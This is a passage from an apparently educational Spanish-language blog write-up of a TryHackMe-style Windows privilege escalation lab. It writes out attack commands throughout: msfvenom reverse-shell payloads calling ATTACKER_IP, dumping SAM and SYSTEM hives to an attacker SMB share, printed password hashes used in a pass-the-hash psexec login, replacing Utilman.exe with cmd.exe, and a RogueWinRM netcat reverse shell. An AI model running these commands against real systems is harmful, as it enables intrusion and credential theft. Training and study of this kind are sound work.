		<img src="{{ 'assets/img/THM/Pasted image 20220901132113.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Retrieve Credentials from Software: PuTTY*

	PuTTY es un cliente SSH para Windows OS. Este tiene la ventaja de, en lugar de especificar los parámetros de conexión cada vez (IP, nombre de usuario, etc), PuTTY guarda todos estos datos para usos posteriores. Aunque no deja que se guarden contraseñas, si permite el guardado de configuraciones proxy que si pueden contener credenciales. 

	Para extraer credenciales proxy guardadas utilizamos el siguiente comando:

	```bash
	reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
	```

	*El nomrbre de SimonThtam es parte del path*

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901133717.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

**Other Quick Wins**

Continuamos viendo vectores de escalada de privilegios menos frecuentes en Windows OS. 

- *Scheduled Tasks*: 

	De la misma forma que en Linux OS, pueden haber tareas programadas para ejecutarse periódicamente que ejecuten un binario no supervisado correctamente cuyo contenido se puede modificar o directamente el binario se puede cambiar por un binario malicioso consiguiendo de forma efectiva ejecución arbitraria de código. 

	Esto se haría en diversos pasos:

	- En primer lugar, listamos *scheduled tasks* con el comando *schtasks* desde una cmd, podemos añadir opciones para además extraer información detallada:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901143214.png' | relative_url }}" text-align="center"/>
	</div>

	De entre toda la información presentada, normalmente lo que más nos interesa son los parámetros "*Task To Run*" y "*Run As User* que nos informan respectivamente de qué se ejecuta y por quién. 	

	- Así, si nuestro usuario puede modificar el mencionado binario, podemos en definitiva controlar qué se ejecuta por otro usuario consiguiendo en términos prácticos una escalada de privilegios (ya que, en definitiva, ejecutamos código como otro usuario).

		En este contexto es útil el comando *icacls*, que nos permite conocer los permisos de un ficheor ejecutable:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901144127.png' | relative_url }}" text-align="center"/>
		</div>

		La imagen anterior nos muestra los grupos que tienen permisos sobre el fichero, en concreto la opción (F) nos muestra que tienen Full access.

	- Con lo cual, sólo queda insertar dentro del binario código malicioso, como una revershell:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901144702.png' | relative_url }}" text-align="center"/>
		</div>

		Y ejecutar la tarea:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901144717.png' | relative_url }}" text-align="center"/>
		</div>

		Escuchándo previamente conexiones en nuestra máquina local:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901144738.png' | relative_url }}" text-align="center"/>
		</div>

		<br />

- *AlwaysInstallElevated*:

	Los archivos de instalación de Windows (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Por lo general, se ejecutan con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos pueden configurarse para ejecutarse con mayores privilegios desde cualquier cuenta de usuario (incluso las que no tienen privilegios). Esto podría permitirnos generar un archivo MSI malicioso con MSFVenom que se ejecutaría con privilegios de administrador.

	```bash
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.135.134 LPORT=LOCAL_PORT -f msi -o malicious.msi
	```

	<br />

**Window Services. Abusing Service Misconfiguration**

- *Windows Services*: 

	Un *servicio* es concretamente una funcionalidad proporcionada por una entidad ajena al usuario, ya sea una tarea automatizada por el sistema o una funcionalidad que proporciona un servidor externo. 
	
	Windows tiene su propio gestor de servicios denominado SCM (Service Control Manager). Dentro del ecosistema de Windows, *SCM se entiende como un proceso que gestiona el estado de otros servicios*.
	
	Cada servicio en Windows OS tiene asociado un ejecutable el cual es ejecutado por el SCM cada vez que dicho servicio es iniciado. (Es importante notar que un servicio como proceso tiene funciones especiales que le permiten comunicarse con el SCM, cualquier proceso que no cuente con estas funciones especiales no puede ser considerado un proceso).
	
	Para comprender mejor la estructura de un servicio en Windows podemos utilizar el comando *sc qc*, por ejemplo:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901185556.png' | relative_url }}" text-align="center"/>
	</div>
	
	El sistema despliega una serie de parámetros asociados al servicio, de entre los más destacables se encuentran:
	
	- *BINARY_PATH_NAME*: Que contiene la ruta del ejecutable asociado al servicio.
	- *SERVICE_START_NAME*: La cuenta encargada de ejecutar el servicio. 
	
	Por otra parte, cada servicio tiene un DACL (Discretionary Access Control List) que indica quién tiene permiso para manipular (start, stop, pause, query status, etc) dicho servicio:
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901190510.png' | relative_url }}" text-align="center"/>
	</div>
	
	Todas las configuraciones de los servicios se almacenan en: *HKLM\\SYSTEM\\CurrentControlSet\\Services\\*
	
	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220901190642.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

- *Abusing Service Misconfiguration*:

	Una vez que conocemos en cierta medida qué es y cómo está regulado un servicio veámos cómo podemos aprovecharnos de posibles malconfiguraciones de servicios en Windows. 

	- *Insecure Permissions on Service Executable*: 

		Un caso obvio sería aquel en el que el ejecutable asociado esté débilmente securizado o protegido, lo cual permitiría a un atacante modificarlo o directametne reemplazarlo consiguiendo así ejecución una elevación de privilegios.

		Así, veámos un ejemplo de esto en el servicio Splinterware System Scheduler:

		- Primero, buscamos la configuración del servicio con *sc qc*:

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901193557.png' | relative_url }}" text-align="center"/>
			</div>

			Vemos que el ejecutable es *C:\\PROGRA~2\\SYSTEM~1\\WService.exe* y el usuario que lo ejecuta es .\\svcuser1 

		-	Veamos entonces qué grupos pueden correr el ejecutable con *icacls*:

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901194405.png' | relative_url }}" text-align="center"/>
			</div>

			Observamos que los usuarios del grupo Everyone tienen permisos M (modify) sobre el ejecutable asociado al servicio. De esta forma, podemos fabricar un archivo malicioso con msfvenom y ponemos en escucha un servidor http en python:

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901195230.png' | relative_url }}" text-align="center"/>
			</div>

			Observamos que el tipo de fichero en el que se construye el payload no es 'exe' sino, 'exe-service', por lo anteriormente mencionado sobre las funcionalidades que debe tener un servicio para comunicarse con el SCM.
			
		- De forma que descargamos desde la otra página con Powershell y lo reemplezamos por el ejecutable en cuestión:

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901195526.png' | relative_url }}" text-align="center"/>
			</div>

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901195536.png' | relative_url }}" text-align="center"/>
			</div>

			Acto seguido iniciariamos la revershell escuchando con un puerto con Netcat y activamos el servicio:

			<div style="text-align:center">
				<img src="{{ 'assets/img/THM/Pasted image 20220901195750.png' | relative_url }}" text-align="center"/>
			</div>

			Con esto obtendríamos una shell como otro usuario.

			<br />

	- *Unquoted Service Paths*:

		En algunos servicios de Windows, estos poseen un comportamiento particular por el cual su configuración contiene el parámetro *BINARY_PATH_NAME* que guarda un path sin comillas (unquoted path):

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901201100.png' | relative_url }}" text-align="center"/>
		</div>

		<br />

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901201113.png' | relative_url }}" text-align="center"/>
		</div>

		Una entrecomillación adecuada provoca que SCM distinga sin lugar a dudas cuál es ejecutable adecuado, sin embargo, sin esta pueden haber problemas ya que los espacios pueden volver un comando ambiguo:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901203651.png' | relative_url }}" text-align="center"/>
		</div>

		Los espacios generalmente delimitan la separación entre un binario y un parámetro. Veámos cómo podemos aprovecharnos de esto.

		Esto tiene que ver con la forma en que el CMD analiza un comando. Por lo general, cuando envía una instrucción los espacios se usan como separadores de argumentos a menos que formen parte de un string entrecomillada. Esto significa que la interpretación "correcta" del comando sin comillas sería ejecutar  'C:\\MyPrograms\\Disk.exe' y tomar el resto como argumentos.

		En lugar de fallar como probablemente debería, SCM intenta ayudar al usuario y comienza a buscar cada uno de los binarios en el orden que se muestra en la tabla:

		1.  Primero, busque 'C:\\MyPrograms\\Disk.exe'. Si existe, el servicio ejecutará este ejecutable.
		2.  Si este último no existe, buscará 'C:\\MyPrograms\\Disk Sorter.exe'. Si existe, el servicio ejecutará este ejecutable.
		3.  Si este último no existe, buscará 'C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe'. Se espera que esta opción tenga éxito y, por lo general, se ejecutará en una instalación predeterminada.

		Llegados a este punto, el problema se vuelve evidente. Si un atacante conociera este comportamiento y encontrara una debilidad de este tipo podría introducir un ejecutable malicioso con un nombre parecido que fuera ejecutado en uno de los pasos anteriores.

		Es importante recordar que debemos tener permisos de escritura en el directorio en el que queremos depositar nuestro binario malicioso, esto en general no es posible en carpetas como *Program Files* o por el estilo. Podemos comprobarlo con *icacls*.

		<br />

	- *Insecure Service Permissions*:

		Un último caso consiste en que el DACL de un servicio te permita modificar su configuración permitiéndote cambiar el binario asociado al servicio por uno malicioso.

		Para acceder al DACL de un servicio utilizamos el comando *Accesschk*:

		<div style="text-align:center">
			<img src="{{ 'assets/img/THM/Pasted image 20220901224341.png' | relative_url }}" text-align="center"/>
		</div>

		Observamos que el grupo *BUILTIN\\Users* tiene el permiso SERVICE_ALL_ACCESS que significa que cualquier usuario puede reconfigurar el servicio. 

		Así, creamos un ejecutable malicioso:

		```bash
		user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
		```

		Le damos permisos:

		```cmd
		C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
		```

		Y cambiamos el ejecutable:

		```cmd
		C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
		```

		Y lo demás queda encender el servicio.
		
		<br />

**Abusing dangerous privileges**

Los privilegios son permisos concretos que una cuenta tiene para desempeñar tareas relacionadas con el sistema. Cada usuario tiene su propio conjunto de privilegios que se pueden ver con el comando:

```cmd
whoami /priv
```

Aunque podemos encontrar una toda una lista de privilegios [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) desde el punto de vista del atacante nos interesan aquellos privilegios que nos sirven para desempeñar tareas con más permisos de los que tenemos, es decir, en definitiva, para elevar privilegios, resumidos en [esta página](https://github.com/gtworek/Priv2Admin). 

Aunque nosotros en este curso nos centraremos en algunos:

- *SeBack/SeRestore*:

	Los privilegios *SeBack* y *SeRestore* permite a los usuarios leer y escribir sobre cualquier fichero en el sistema ignorando las regulaciones del DACL (Discretionary Access Control List, herramienta empleada por windows para regular quién puede acceder a qué recurso en el sistema).

	Con esta capacidad se pueden elevar privilegios mediante muchos mecanismos, podemos intentar por ejemplo copiar el registro SAM y SYSTEM para recuperar el hash de la contraseña del administrador. 

	Por ejemplo, supongámos que estamos en una cuenta que posee tales privilegios, empleamos el comando *whoami /priv* para conocer nuestros permisos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902110055.png' | relative_url }}" text-align="center"/>
	</div>

	Seguidamente copiamos los registros SAM y SYSTEM (recordamos que el SAM son las siglas correspondientes a Securoty Accounts Manager y es un fichero que actúa a modo de base de datos para los Windows OS que contiene usernames y passwords):

	```cmd
	C:\> reg save hklm\system C:\Users\THMBackup\system.hive 
	The operation completed successfully. 
	C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive 
	The operation completed successfully.
	```

	Seguidamente pasamos estos ficheros a nuestra máquina atacante mediante el siguiente procedimiento:

	En primer lugar, en nuestra máquina Linux montamos con Python un nexo con la máquina víctima empleando el paquete de python *smbserver.py* para iniciar un servidor SMB simple:
	
	```bash
	user@attackerpc$ mkdir share 
	user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
	```

	Y en la máquina Windows copiamos los mencionados ficheros a la máquina atacante:

	```cmd
	C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
	```

	Y en la máquina atacante recuperamos los hashes

	```bash
	user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL 
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation 
	
	[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94::: 
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	```

	Finalmente con estas credenciales podemos perpetrar un Pass-the-Hash attack y ganar acceso a la máquina con una cuenta con privilegios superiores:

	```bash
	user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes 	aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.134.52 
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation 
	
	[*] Requesting shares on 10.10.175.90..... 
	[*] Found writable share ADMIN$ 
	[*] Uploading file nfhtabqO.exe 
	[*] Opening SVCManager on 10.10.175.90..... 
	[*] Creating service RoLE on 10.10.175.90..... 
	[*] Starting service RoLE..... 
	[!] Press help for extra shell commands 
	Microsoft Windows [Version 10.0.17763.1821] 
	(c) 2018 Microsoft Corporation. All rights reserved.
	
	 C:\Windows\system32> whoami 
	 
	 nt authority\system
	```

	<br />

- *SeTakeOwnership*:

	El privilegio *SeTakeOwnership* permite a un usuario adquirir la propiedad sobre cualquier objeto en el sistema (ficheros, system keys, etc). 

	En primer lugar, acudimos a nuestro usuario y miramos los privilegios que poseemos con: *whoami /priv*:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902123843.png' | relative_url }}" text-align="center"/>
	</div>

	Podemos observar que tenemos el privilegio de TakeOwnership. Vamos a explotar esta característica mediante *utilman.exe*, este es un servicio que ofrece acceso a una serie de opciones en la pantalla de bloqueo:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902124119.png' | relative_url }}" text-align="center"/>
	</div>

	Por un lado, este binario se ejecuta como SYSTEM, por otro lado, como tenemos el privilegio anterior, podemos hacernos con su propiedad fácilmente y reemplazar así el contenido. En consecuencia, podemos adquirir la capacidad de ejecutar código arbitrario en el sistema con otra cuenta que es en un sentido efectivo una escalada de privilegios.

	Así, en primer lugar, tomamos posesión del archivo:

	```cmd
	C:\> takeown /f C:\Windows\System32\Utilman.exe 
	
	SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
	```

	Esto no nos da permisos sobre el fichero pero al ser propietarios podemos asignarnos cualquier permiso:

	```cmd
	C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F 
	processed file: Utilman.exe 
	Successfully processed 1 files; Failed processing 0 files
	```

	Seguidamente reemplazamos el fichero malicioso:

	```cmd
	C:\Windows\System32\> copy cmd.exe utilman.exe 1 file(s) copied.
	```
	
	Seguidamente cerramos sesión y clickamos sobre "Ease of Access" para abrir una cmd como administrador.

	<br />

- *SeImpersonate/SeAssignPrimaryToken*:

	El privilegio *SeImpersonate/SeAssignPrimaryToken* permite a un proceso impersonar otros usuarios y actuar en su nombre. Concretamente impersonar consiste en ser capaz de realizar una acción en el contexto de seguridad de otro usuario. 

	En primer lugar, un proceso consiste en la ejecución de una instancia de un programa en memoria por orden de una cuenta de usuario, es decir; es un conjunto de instrucciones asociadas a un programa (un script, un servidor FTP, etc) instruidas por una cuenta de usuario (admin, guess, daemons, etc) y procesadas por el sistema (RAM, CPU, etc). En un sentido "coloquial" podríamos decir que un proceso en esencia es un usuario generando acciones en memoria. 
	
	Por ejemplo, supongámos que tenemos un *servidor ftp* que se ejecuta en un proceso iniciado por el usuario *ftp*, esto significa que las instrucciones propias del servidor FTP son llevadas a cabo por el usuario que ha iniciado el proceso en el que corre sicho servidor y, por tanto, estas tienen el alcance que el contexto de seguridad del usuario ftp (sus privilegios), le permiten tener. 
	
	Siguiendo esta lógica, el mecanismo de la impersonación cobra relevancia cuando un usuario distinto como Ann intenta logearse y acceder a sus ficheros. En este caso, lo que Ann hace es autenticarse de cara al servidor FTP pero no al sistema como tal y cuando envía instrucciones sobre el primero este las transfiere a modo de instrucciones que son ejecutadas por el usuario ftp a ojos del sistema tal y como hemos visto antes. De esta forma, sin el mecanismo de *impersonation*, el usuario ftp intentaría procesar la instrucción del usuario Ann e intentaría acceder a sus ficheros fallando en el intento porque necesita el contexto de seguridad asociado a Ann para acceder a sus recursos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902134906.png' | relative_url }}" text-align="center"/>
	</div>

	Para que el usuario ftp (que es el propietario del proceso en el que se ejecuta el servidor ftp y por tanto, para el sistema operativo, el que intenta acceder a cualquier recurso a través del servidor FTP con independencia de quién esté logeado) tenga acceso a recursos foráneos debe tener permisos. Gracias a los privilegios de SeImpersonate o SeAssignPrimaryToken, el servicio FTP puede actuar en nombre de otro usuario temporalmente gracias a un token de acceso. 

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902171209.png' | relative_url }}" text-align="center"/>
	</div>

	Desde el punto de vista del atacante, que exista una cuenta con privilegios que le permita impersonar a otros usuarios resulta muy interesante. En Windows las cuentas como LOCAL SERVICE o NETWORK SERVICE ACCOUNTS tienen tales privilegios ya que estas cuentas se dedican a spawnear procesos desde cuentas restringidas.

	Para elevar privilegios a través de estas cuentas un atacante debe seguir los siguientes pasos:

	1. Spawnear un proceso que permita la impersonación sobre otros usuarios (como el servidor FTP).
	2. Buscar una forma de que usuarios privilegiados se conecten y autentiquen para desencadenar procesos maliciosos en su nombre.

	Vamos a desarrollar un ejemplo con el RogueWinRM exploit para completar ambas condiciones. 

	Supongámos que tenemos un sitio web comprometido en el que hemos obtenido RCE mediante una webshell. Entonces, utilizamos esta para saber los privilegios que tenemos:

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902181130.png' | relative_url }}" text-align="center"/>
	</div>

	Observamos que poseemos una cuenta con dichos privilegios y nos proponemos ahora a usarlos para elevar privilegios, para ello pasamos el exploit a la máquina víctima y de ahí ejecutamos la siguiente instrucción:

	```cmd
	c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
	```

	El comando anterior ejecuta una reverse shell desde la cuenta de SYSTEM, esto se produce gracias a que cada vez que un usuario (incluidos los usuarios sin privilegios) inicia el servicio BITS en Windows, crea automáticamente una conexión al puerto 5985 utilizando los privilegios del SYSTEM. El puerto 5985 generalmente se usa para el servicio WinRM, que es simplemente un puerto que expone una consola Powershell para usarla de forma remota a través de la red, como SSH.

	Si, por algún motivo, el servicio WinRM no se está ejecutando en el servidor de la víctima, un atacante puede iniciar un servicio WinRM falso en el puerto 5985 y detectar el intento de autenticación realizado por el servicio BITS al iniciarse. Si el atacante tiene privilegios de SeImpersonate, puede ejecutar cualquier comando en nombre del usuario que se conecta, que es SYSTEM.

	<div style="text-align:center">
		<img src="{{ 'assets/img/THM/Pasted image 20220902194651.png' | relative_url }}" text-align="center"/>
	</div>

	<br />

**Abusing vulnerable software**

Puede ser que en el sistema operativo existan programas, drivers, etc, en definitiva software vulnerable que nos pueda servir como un vector en al escalada de privilegios. 

Podemos ver qué software tenemos instalado en una máquina Windows OS con *wmic*:

```cmd
wmic product get name,version,vendor
```

Una vez hemos listado software podemos buscar información relacionada con exploits en versiones vulnerables (Exploit-DB, Packet storm, etc) u otros mecanismos ya cubiertos en anteriores entradas de este blog.
